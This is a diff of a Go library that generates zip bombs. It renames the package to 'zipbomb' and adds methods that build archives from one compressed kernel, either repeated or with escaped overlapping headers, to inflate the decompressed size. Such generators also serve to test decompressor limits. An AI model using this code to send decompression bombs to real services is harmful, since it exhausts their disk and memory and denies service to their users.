@@ -1,4 +1,4 @@
-package overlap
+package zipbomb
 
 import (
 	"bufio"
@@ -16,13 +16,8 @@ var (
 	errLongComment = errors.New("comment too long")
 )
 
-type OnFileCreateHookFunc = func(name string)
-
 type Options struct {
-	FilenameGen      filename.Generator
-	EOCDComment      string
-	OnFileCreateHook OnFileCreateHookFunc
-	CompressionLevel int // -2 - 9
+	EOCDComment string
 }
 
 type cdHeader struct {
@@ -35,17 +30,12 @@ type ZipBomb struct {
 	dir              []*cdHeader //central directory
 	uncompressedSize int64
 	zip64            bool
-	kernelName       string
-	kernelSize       uint64
 	opts             Options
 }
 
-// New returns a new overlap zip bomb.
+// New returns a new zip bomb.
 func New(w io.Writer, optFns ...func(o *Options)) (*ZipBomb, error) {
-	opts := Options{
-		FilenameGen:      filename.NewDefaultGenerator(filename.DefaultAlphabet, ""),
-		CompressionLevel: 5,
-	}
+	opts := Options{}
 
 	for _, fn := range optFns {
 		fn(&opts)
@@ -61,25 +51,110 @@ func New(w io.Writer, optFns ...func(o *Options)) (*ZipBomb, error) {
 	}, nil
 }
 
+// func (zb *ZipBomb) AddNoOverlap(kernelBytes []byte, numFiles int) error {
+// 	k, err := newKernel(zb.opts.FilenameGen.Generate(numFiles-1), kernelBytes, zb.opts.CompressionLevel)
+// 	if err != nil {
+// 		return err
+// 	}
+
+// 	for fi := 0; fi < numFiles; fi++ {
+// 	}
+
+// 	return nil
+// }
+
+type OnFileCreateHookFunc = func(name string)
+
+type AddOptions struct {
+	FilenameGen      filename.Generator
+	OnFileCreateHook OnFileCreateHookFunc
+	Method           uint16
+	CompressionLevel int // Deflate [-2,9]
+}
+
 type fileRecord struct {
 	header *fileHeader
 	data   []byte
 }
 
-func (zb *ZipBomb) Generate(kernelBytes []byte, numFiles int) error {
-	k, err := newKernel(zb.opts.FilenameGen.Generate(numFiles-1), kernelBytes, zb.opts.CompressionLevel)
+func (zb *ZipBomb) AddNoOverlap(kernelBytes []byte, numFiles int, optFns ...func(o *AddOptions)) error {
+	opts := AddOptions{
+		FilenameGen:      filename.NewDefaultGenerator(filename.DefaultAlphabet, ""),
+		CompressionLevel: 5,
+		Method:           Deflate,
+	}
+
+	for _, fn := range optFns {
+		fn(&opts)
+	}
+
+	k, err := newKernel(opts.FilenameGen.Generate(numFiles-1), kernelBytes, opts.Method, opts.CompressionLevel)
 	if err != nil {
 		return err
 	}
 
-	zb.kernelName = k.Name()
-	zb.kernelSize = k.UncompressedSize()
+	files := []fileRecord{
+		{
+			header: k.LocalFileHeader(),
+			data:   k.CompressedBytes(),
+		},
+	}
+
+	if opts.OnFileCreateHook != nil {
+		opts.OnFileCreateHook(k.Name())
+	}
+
+	zb.uncompressedSize = zb.uncompressedSize + int64(k.UncompressedSize())
+
+	for fi := 1; fi < numFiles; fi++ {
+		lfh := newFileHeader(
+			k.CompressedSize(),
+			k.UncompressedSize(),
+			k.CRC32(),
+			opts.FilenameGen.Generate(numFiles-1-fi),
+			opts.Method,
+		)
+
+		files = append([]fileRecord{{
+			header: lfh,
+			data:   k.CompressedBytes(),
+		}}, files...)
+
+		zb.uncompressedSize = zb.uncompressedSize + int64(lfh.UncompressedSize)
+
+		if opts.OnFileCreateHook != nil {
+			opts.OnFileCreateHook(lfh.Name)
+		}
+	}
+
+	return zb.writeFiles(files)
+}
+
+func (zb *ZipBomb) AddEscapedOverlap(kernelBytes []byte, numFiles int, optFns ...func(o *AddOptions)) error {
+	opts := AddOptions{
+		FilenameGen:      filename.NewDefaultGenerator(filename.DefaultAlphabet, ""),
+		CompressionLevel: 5,
+		Method:           Deflate,
+	}
+
+	for _, fn := range optFns {
+		fn(&opts)
+	}
+
+	k, err := newKernel(opts.FilenameGen.Generate(numFiles-1), kernelBytes, opts.Method, opts.CompressionLevel)
+	if err != nil {
+		return err
+	}
 
 	files := []fileRecord{
 		{
 			header: k.LocalFileHeader(),
-			data:   k.compressedBytes,
+			data:   k.CompressedBytes(),
 		},
+	}
+
+	if opts.OnFileCreateHook != nil {
+		opts.OnFileCreateHook(k.Name())
 	}
 
 	zb.uncompressedSize = zb.uncompressedSize + int64(k.UncompressedSize())
@@ -107,7 +182,7 @@ func (zb *ZipBomb) Generate(kernelBytes []byte, numFiles int) error {
 
 		crc32.Write(k.Bytes())
 
-		escape := newEscape(zb.opts.FilenameGen.Generate(numFiles-1-fi), next.header, uint16(len(headerBytes)), crc32)
+		escape := newEscape(opts.FilenameGen.Generate(numFiles-1-fi), next.header, uint16(len(headerBytes)), crc32)
 
 		files = append([]fileRecord{{
 			header: escape.LocalFileHeader(),
@@ -116,11 +191,15 @@ func (zb *ZipBomb) Generate(kernelBytes []byte, numFiles int) error {
 
 		zb.uncompressedSize = zb.uncompressedSize + int64(escape.LocalFileHeader().UncompressedSize)
 
-		if zb.opts.OnFileCreateHook != nil {
-			zb.opts.OnFileCreateHook(escape.Name())
+		if opts.OnFileCreateHook != nil {
+			opts.OnFileCreateHook(escape.Name())
 		}
 	}
 
+	return zb.writeFiles(files)
+}
+
+func (zb *ZipBomb) writeFiles(files []fileRecord) error {
 	for _, file := range files {
 		cdHeader := &cdHeader{
 			fileHeader: file.header,
@@ -143,7 +222,7 @@ func (zb *ZipBomb) Generate(kernelBytes []byte, numFiles int) error {
 		}
 	}
 
-	return zb.close()
+	return nil
 }
 
 func (zb *ZipBomb) UncompressedSize() int64 {
@@ -154,15 +233,7 @@ func (zb *ZipBomb) IsZip64() bool {
 	return zb.zip64
 }
 
-func (zb *ZipBomb) KernelName() string {
-	return zb.kernelName
-}
-
-func (zb *ZipBomb) KernelSize() uint64 {
-	return zb.kernelSize
-}
-
-func (zb *ZipBomb) close() error {
+func (zb *ZipBomb) Close() error {
 	// write central directory
 	start := zb.cw.count
 
